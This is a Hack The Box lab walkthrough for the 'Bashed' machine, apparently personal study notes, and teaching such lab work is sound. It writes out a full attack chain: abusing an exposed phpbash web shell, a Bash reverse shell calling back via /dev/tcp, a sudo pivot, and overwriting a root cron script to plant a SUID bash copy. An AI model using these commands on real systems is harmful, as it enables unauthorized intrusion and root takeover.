---
tags: [htb, box, linux, easy, web, command-injection, cron]
platform: HTB
os: Linux (Ubuntu 16.04)
hostname: bashed
domain: N/A
difficulty: Easy
ip: $BoxIP
status: complete
---

# HTB: Bashed, Full Walkthrough

## The gist

Bashed exposes a development PHP web shell at `/dev/phpbash.php`. A harmless `id` request confirms command execution as `www-data`, which provides the foothold. The web user can run a shell as `scriptmanager` through passwordless sudo. A root-owned scheduled task executes the writable `/scripts/test.py`; replacing that script creates a root-owned SUID Bash helper and provides root access.

## Box information

| Field | Value |
|---|---|
| Platform | Hack The Box |
| OS | Linux |
| Difficulty | Easy |
| IP | `$BoxIP` |
| Hostname | `bashed` |
| Attack path | Exposed PHP web shell -> reverse shell -> sudo run-as pivot -> writable scheduled script -> SUID Bash |

## Variables

```bash
boxstart Bashed $BoxIP htb
export WebPort=80
export LocalIP=$(ip route get $BoxIP | awk '{print $7; exit}')
export Port=4444
export Path=dev/phpbash.php
export ScriptDir=/scripts
export ScriptPath=/scripts/test.py
export OutputPath=/scripts/test.txt
```

## 1. Reconnaissance

```bash
sudo nmap -n -p- --min-rate 5000 $BoxIP -oA nmap/allports
sudo nmap -Pn -n -sC -sV -p 80 $BoxIP -oA nmap/services
sudo nmap -Pn -n -sU --top-ports 100 $BoxIP -oA nmap/udp-top100
```

The full TCP scan returned only HTTP on port 80. Service detection identified Apache 2.4.18 on Ubuntu. The UDP top-100 check did not reveal a useful service.

![[nmap-allports.png]]
SCREENSHOT: TCP port scan showing only 80/tcp open.

![[nmap-services.png]]
SCREENSHOT: Apache service and title enumeration.

## 2. Web enumeration

```bash
curl -sS -L http://$BoxIP/ -o "$BoxDir/loot/index.html"
feroxbuster -u http://$BoxIP/ -w /usr/share/wordlists/dirb/common.txt -x php -t 40
curl -sS http://$BoxIP/dev/phpbash.php -o "$BoxDir/loot/phpbash.php"
curl -sS http://$BoxIP/dev/phpbash.min.php -o "$BoxDir/loot/phpbash.min.php"
curl -sS http://$BoxIP/config.php -o "$BoxDir/loot/config.php"
grep -Ein 'cmd|command|POST|GET|shell_exec|system|passthru' "$BoxDir/loot/phpbash.php"
```

The development directory exposed `phpbash.php`, a functional PHP command shell. `phpbash.min.php` was also present, while `config.php` returned no useful content.

![[curl-homepage.png]]
SCREENSHOT: Homepage source and the exposed development link.

![[feroxbuster.png]]
SCREENSHOT: Directory and PHP file enumeration.

## 3. Confirm command execution

Use a harmless identity check before attempting a callback:

```bash
curl -sS -X POST --data-urlencode 'cmd=id' http://$BoxIP/dev/phpbash.php
```

The response showed command execution as `www-data`.

![[webshell-curl-id.png]]
SCREENSHOT: Harmless `id` command executed through phpbash.

## 4. Obtain and stabilize the foothold

Start the listener, then submit the Bash reverse-shell command through the web shell:

```bash
nc -lvnp $Port
curl -sS -X POST --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LocalIP/$Port 0>&1'" "http://$BoxIP/$Path" >/dev/null
```

The callback arrived in the web application directory as `www-data`. Stabilize it:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Suspend and resume the listener as needed, then set terminal behavior:

```text
Ctrl-Z
stty raw -echo
fg
export TERM=xterm
```

![[reverse-shell-caught.png]]
SCREENSHOT: Reverse shell received as www-data.

![[pty-stabilised.png]]
SCREENSHOT: PTY allocated and terminal stabilized.

## 5. Local enumeration and sudo pivot

```bash
id
sudo -l
```

The important sudo rule was:

```text
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

![[sudo-l.png]]
SCREENSHOT: Passwordless sudo rule permitting the run-as pivot.

Switch to the permitted account:

```bash
sudo -u scriptmanager /bin/bash -i
id
whoami
```

![[scriptmanager-id.png]]
SCREENSHOT: Identity confirmed as scriptmanager.

Inspect the discovered script directory:

```bash
ls -la $ScriptDir
cat $ScriptPath
stat $ScriptPath $OutputPath
```

![[scripts-ls.png]]
SCREENSHOT: `/scripts` contents and ownership.

The original `test.py` content was:

```python
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

![[scripts-content.png]]
SCREENSHOT: Original `test.py` content.

The script was writable by `scriptmanager`, while `test.txt` was owned by root. File timestamps showed that the scheduled task was executing the script and updating the root-owned output.

![[stat-timing.png]]
SCREENSHOT: `stat` ownership and timestamp evidence showing the scheduled execution interval.

![[user-flag.png]]
SCREENSHOT: User proof confirmed at the documented path.

## 6. Abuse the root scheduled task

Save the original script before testing, then replace only the authorized lab file:

```bash
cat $ScriptPath | tee "$BoxDir/loot/test.py.original"
printf 'import os\nos.system("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash")\n' > $ScriptPath
stat $ScriptPath
ls -la /tmp/rootbash
```

![[payload-written.png]]
SCREENSHOT: Replacement payload written to the scheduled script.

After the next scheduled execution, verify the helper:

```bash
ls -la /tmp/rootbash
/tmp/rootbash -p
id
whoami
```

![[rootbash-created.png]]
SCREENSHOT: Root-owned SUID Bash helper created by the scheduled task.

The resulting Bash process had effective UID 0 and `whoami` returned `root`.

![[root-shell.png]]
SCREENSHOT: Root shell obtained through the SUID Bash helper.

## 7. Root verification and loot locations

```bash
id
whoami
hostname
ls -la /root/root.txt /home/arrexel/user.txt
```

The user proof was confirmed at `/home/arrexel/user.txt` and the root proof at `/root/root.txt`. Flag values are intentionally omitted from this write-up.

![[root-flag.png]]
SCREENSHOT: Root proof confirmed at the documented path.

## 8. Clean down

Restore the exact original scheduled script and remove the temporary SUID helper from a root-context shell:

```bash
printf 'f = open("test.txt", "w")\nf.write("testing 123!")\nf.close\n' > $ScriptPath
/tmp/rootbash -p -c 'rm -f /tmp/rootbash; test ! -e /tmp/rootbash && echo rootbash-removed'
stat $ScriptPath
ls -la /tmp/rootbash
boxdone
```

If the helper was created with root ownership, a non-root shell cannot remove it. Perform cleanup before closing the root context, then verify that the helper is absent and the original script is restored.

![[clean-down.png]]
SCREENSHOT: Restored script and cleaned temporary helper.

## RUNBOOK V2 stages used

- [[OSCP/RUNBOOK V2/Start Here|Start Here]]
- [[OSCP/RUNBOOK V2/Port Triage|Port Triage]]
- [[OSCP/RUNBOOK V2/Linux - Service Scan|Linux - Service Scan]]
- [[OSCP/RUNBOOK V2/Linux - Web Enum|Linux - Web Enum]]
- [[OSCP/RUNBOOK V2/Linux - Command Injection|Linux - Command Injection]]
- [[OSCP/RUNBOOK V2/Linux - RCE to Shell|Linux - RCE to Shell]]
- [[OSCP/RUNBOOK V2/Linux - Shell Stabilise|Linux - Shell Stabilise]]
- [[OSCP/RUNBOOK V2/Linux - Local Enum|Linux - Local Enum]]
- [[OSCP/RUNBOOK V2/Linux - Sudo Check|Linux - Sudo Check]]
- [[OSCP/RUNBOOK V2/Linux - Cron Check|Linux - Cron Check]]
- [[OSCP/RUNBOOK V2/Linux - Clean Down|Linux - Clean Down]]

## Attack chain

```text
HTTP enumeration
  -> exposed phpbash development file
  -> command execution as www-data
  -> Bash reverse shell
  -> passwordless sudo to scriptmanager
  -> writable script executed by root
  -> root-owned SUID Bash helper
  -> effective UID 0
```

## Credentials and proof

| Account | Source | Use |
|---|---|---|
| `www-data` | PHP web shell | Initial foothold |
| `scriptmanager` | `sudo -l` | Local enumeration and script modification |
| `root` | Scheduled script abuse | Final access |

- `user.txt`: confirmed at `/home/arrexel/user.txt`
- `root.txt`: confirmed at `/root/root.txt`

## Key lessons

- Development files and web shells left on production systems are high-value findings -- always enumerate `/dev/`, `/test/`, `/backup/` and similar directories.
- A phpbash form can declare `method="GET"` while its JavaScript sends POST; source analysis reveals the actual request method and parameter.
- A passwordless `sudo -u <user>` rule is a **lateral move**, not a privesc. The goal is to gain a different user's context and reach their writable files or sudo rules, not root directly.
- Proving writable cron script abuse requires four things: writability confirmed, execution confirmed (root-owned output), ownership mismatch (scriptmanager writes, root owns output), and timing (stat Modify `:01` seconds = per-minute cron fingerprint).
- `/tmp/rootbash -p` prevents Bash from dropping its SUID privileges. Without `-p`, the shell falls back to the invoking account rather than remaining root.
- `stat` output showing `Modify` at `:01` seconds is a per-minute cron fingerprint and provides timing evidence for scheduled-task execution.

## Checklist

- [x] Full TCP and targeted UDP enumeration completed
- [x] Web content and PHP development files enumerated
- [x] Command execution validated with a harmless identity check
- [x] Reverse shell obtained and stabilized
- [x] Sudo permissions enumerated and run-as pivot completed
- [x] Scheduled script writability and execution evidence captured
- [x] Root access obtained and verified
- [x] User and root proof paths confirmed
- [x] Original script restored and temporary helper removed
- [x] Screenshots and original script saved to loot

## Related boxes

- [[Nibbles]] -- web enumeration and command execution
- [[OpenAdmin]] -- exposed administrative web content
- [[Nukem]] -- Linux web exploitation and privilege escalation

## External resources

- [HackTricks Linux scheduled tasks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/README.html)
- [GTFOBins Bash](https://gtfobins.github.io/gtfobins/bash/)
- [phpbash](https://github.com/Arrexel/phpbash)

## Further reading

- [IppSec -- Bashed](https://www.youtube.com/watch?v=K9DKUL7t2xE)
